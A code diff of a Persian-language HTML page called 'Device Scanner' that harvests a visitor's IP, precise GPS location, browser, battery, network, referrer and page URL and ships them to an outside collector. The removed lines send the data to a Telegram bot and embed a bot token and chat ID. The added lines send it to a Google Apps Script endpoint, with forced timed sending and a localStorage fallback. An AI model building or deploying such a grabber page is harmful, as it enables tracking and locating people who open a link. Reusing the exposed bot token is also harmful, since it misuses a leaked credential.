@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Scanner</title>
+    <title>Device Scanner</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -16,53 +16,61 @@
         .status {
             font-size: 24px;
             margin-top: 30px;
+            padding: 15px;
+            border-radius: 10px;
         }
-        .loading {
-            color: #ffaa00;
-        }
-        .success {
-            color: #00ff88;
-        }
-        .error {
-            color: #ff4444;
-        }
+        .loading { color: #ffaa00; background: #332200; }
+        .success { color: #00ff88; background: #003322; }
+        .error { color: #ff4444; background: #330000; }
         #log {
             background: #1a1a1a;
             padding: 20px;
             border-radius: 10px;
-            max-width: 500px;
+            max-width: 600px;
             margin: 20px auto;
             text-align: right;
             font-size: 13px;
-            max-height: 300px;
+            max-height: 400px;
             overflow: auto;
             font-family: monospace;
+            border: 1px solid #333;
         }
+        #log div {
+            padding: 4px 0;
+            border-bottom: 1px solid #222;
+        }
+        .icon { font-size: 48px; margin-bottom: 20px; }
     </style>
 </head>
 <body>
-    <h1>📱 در حال جمع‌آوری اطلاعات...</h1>
+    <div class="icon">📱</div>
+    <h1>در حال جمع‌آوری اطلاعات...</h1>
     <div id="log"></div>
     <div class="status loading" id="status">⏳ لطفاً صبر کنید...</div>
 
     <script>
-    // ===== تنظیمات شما =====
-    const botToken = '8874650639:AAEsfjBTpVVUuGUQq1FpliGdqh5GAWhD6BQ';
-    const chatId = '7881167408';
-    // ========================
+    // ===== تنظیمات =====
+    const scriptUrl = 'https://script.google.com/macros/s/AKfycbxxkgUnO7isj6yVBqPxY05XR2kHDe3kIg_fIo7Z8qPK9b7OXkABetDfk6YdlmLOypg5/exec';
+    // ===================
 
     const logElement = document.getElementById('log');
     const statusElement = document.getElementById('status');
 
     function addLog(msg, isError = false) {
         const color = isError ? '#ff4444' : '#00ff88';
-        logElement.innerHTML += `<div style="color: ${color}; margin: 5px 0;">▶ ${msg}</div>`;
+        const time = new Date().toLocaleTimeString('fa-IR');
+        logElement.innerHTML += `<div style="color: ${color};"><span style="color: #888;">[${time}]</span> ${msg}</div>`;
         logElement.scrollTop = logElement.scrollHeight;
+    }
+
+    function setStatus(text, type = 'loading') {
+        statusElement.textContent = text;
+        statusElement.className = 'status ' + type;
     }
 
     addLog('🔄 شروع جمع‌آوری اطلاعات...');
 
-    // جمع‌آوری اطلاعات
+    // ===== جمع‌آوری اطلاعات =====
     const data = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
@@ -78,12 +86,14 @@
         ip: null,
         location: null,
         battery: null,
-        connection: null
+        network: null,
+        referrer: document.referrer || 'مستقیم',
+        pageURL: window.location.href
     };
 
-    addLog('✅ اطلاعات دستگاه جمع شد');
+    addLog('✅ اطلاعات پایه جمع شد');
 
-    // گرفتن IP
+    // ===== گرفتن IP =====
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
         .then(r => {
@@ -92,11 +102,12 @@
             checkAndSend();
         })
         .catch(() => {
-            addLog('⚠️ خطا در دریافت IP', true);
+            addLog('⚠️ خطا در دریافت IP (آفلاین یا محدودیت)', true);
+            data.ip = 'دریافت نشد';
             checkAndSend();
         });
 
-    // گرفتن موقعیت
+    // ===== گرفتن موقعیت =====
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             pos => {
@@ -105,16 +116,19 @@
                     lng: pos.coords.longitude,
                     accuracy: pos.coords.accuracy
                 };
-                addLog(`✅ موقعیت: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                addLog(`✅ موقعیت: ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`);
             },
-            () => {
-                data.location = 'دسترسی به موقعیت رد شد';
-                addLog('⚠️ دسترسی به موقعیت رد شد', true);
+            (err) => {
+                data.location = 'دسترسی رد شد';
+                addLog('⚠️ دسترسی به موقعیت رد شد: ' + err.message, true);
             }
         );
+    } else {
+        data.location = 'مرورگر پشتیبانی نمیکند';
+        addLog('⚠️ مرورگر موقعیت را پشتیبانی نمیکند', true);
     }
 
-    // گرفتن باتری
+    // ===== گرفتن باتری =====
     if (navigator.getBattery) {
         navigator.getBattery().then(battery => {
             data.battery = {
@@ -123,64 +137,103 @@
             };
             addLog('✅ باتری: ' + data.battery.level);
             checkAndSend();
+        }).catch(() => {
+            data.battery = 'دریافت نشد';
+            addLog('⚠️ خطا در دریافت باتری', true);
         });
+    } else {
+        data.battery = 'مرورگر پشتیبانی نمیکند';
+        addLog('⚠️ مرورگر باتری را پشتیبانی نمیکند', true);
     }
 
-    // گرفتن اطلاعات شبکه
+    // ===== گرفتن شبکه =====
     if (navigator.connection) {
-        data.connection = {
-            type: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink + ' Mbps',
-            rtt: navigator.connection.rtt + ' ms'
+        data.network = {
+            type: navigator.connection.effectiveType || 'unknown',
+            downlink: navigator.connection.downlink || '?',
+            rtt: navigator.connection.rtt || '?'
         };
-        addLog('✅ شبکه: ' + data.connection.type);
+        addLog('✅ شبکه: ' + data.network.type);
+    } else {
+        data.network = 'مرورگر پشتیبانی نمیکند';
+        addLog('⚠️ مرورگر شبکه را پشتیبانی نمیکند', true);
     }
 
+    // ===== گرفتن اطلاعات ویندوز =====
+    if (navigator.getVRDisplays) {
+        data.vr = 'پشتیبانی دارد';
+    } else {
+        data.vr = 'ندارد';
+    }
+
+    // ===== ارسال =====
     let sent = false;
 
     function checkAndSend() {
         if (sent) return;
-        // منتظر بمون تا همه اطلاعات بیاد
+        // منتظر میمونیم تا همه اطلاعات برسه
         setTimeout(() => {
-            sendToTelegram();
+            sendToSheet();
             sent = true;
-        }, 2000);
+        }, 3000);
     }
 
-    // ارسال به تلگرام شما
-    function sendToTelegram() {
-        addLog('📤 ارسال به تلگرام...');
-        
-        const text = encodeURIComponent(JSON.stringify(data, null, 2));
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${text}`;
+    function sendToSheet() {
+        addLog('📤 ارسال به Google Sheets...');
+        setStatus('⏳ در حال ارسال به گوگل شیت...', 'loading');
 
-        fetch(url)
-            .then(res => res.json())
-            .then(result => {
-                if (result.ok) {
-                    addLog('✅ با موفقیت به تلگرام شما ارسال شد!');
-                    statusElement.className = 'status success';
-                    statusElement.innerHTML = '✅ اطلاعات به تلگرام شما ارسال شد!';
-                } else {
-                    addLog('❌ خطا: ' + result.description, true);
-                    statusElement.className = 'status error';
-                    statusElement.innerHTML = '❌ خطا در ارسال: ' + result.description;
-                }
-            })
-            .catch(err => {
-                addLog('❌ خطای شبکه: ' + err.message, true);
-                statusElement.className = 'status error';
-                statusElement.innerHTML = '❌ خطای شبکه';
-            });
+        fetch(scriptUrl, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data)
+        })
+        .then(() => {
+            addLog('✅ اطلاعات با موفقیت ذخیره شد!');
+            setStatus('✅ اطلاعات به Google Sheets ارسال شد!', 'success');
+            
+            // نمایش خلاصه
+            const summary = document.createElement('div');
+            summary.style.cssText = 'margin-top: 20px; padding: 20px; background: #1a1a1a; border-radius: 10px; text-align: right; font-size: 14px;';
+            summary.innerHTML = `
+                <strong>📊 خلاصه اطلاعات:</strong><br>
+                IP: ${data.ip || 'نامشخص'}<br>
+                مرورگر: ${data.userAgent.substring(0, 50)}...<br>
+                صفحه: ${data.screen}<br>
+                زمان: ${new Date(data.time).toLocaleString('fa-IR')}
+            `;
+            document.body.appendChild(summary);
+        })
+        .catch((err) => {
+            addLog('❌ خطا در ارسال: ' + err.message, true);
+            setStatus('❌ خطا در ارسال به گوگل شیت', 'error');
+            
+            // ذخیره در LocalStorage به عنوان بک‌آپ
+            try {
+                const backups = JSON.parse(localStorage.getItem('scanner_backups') || '[]');
+                backups.push(data);
+                localStorage.setItem('scanner_backups', JSON.stringify(backups));
+                addLog('💾 اطلاعات در LocalStorage ذخیره شد (بک‌آپ)', false);
+            } catch(e) {}
+        });
     }
 
-    // بک‌آپ: بعد ۵ ثانیه حتماً بفرست
+    // ===== بک‌آپ: بعد ۷ ثانیه حتماً بفرست =====
     setTimeout(() => {
         if (!sent) {
-            sendToTelegram();
+            sendToSheet();
             sent = true;
         }
-    }, 5000);
+    }, 7000);
+
+    // ===== نمایش وضعیت نهایی بعد از ۱۰ ثانیه =====
+    setTimeout(() => {
+        if (sent) return;
+        setStatus('⚠️ زمان ارسال به پایان رسید، دوباره تلاش کنید', 'error');
+        addLog('⏰ زمان ارسال به پایان رسید', true);
+    }, 10000);
     </script>
 </body>
-</html>
+    </html>
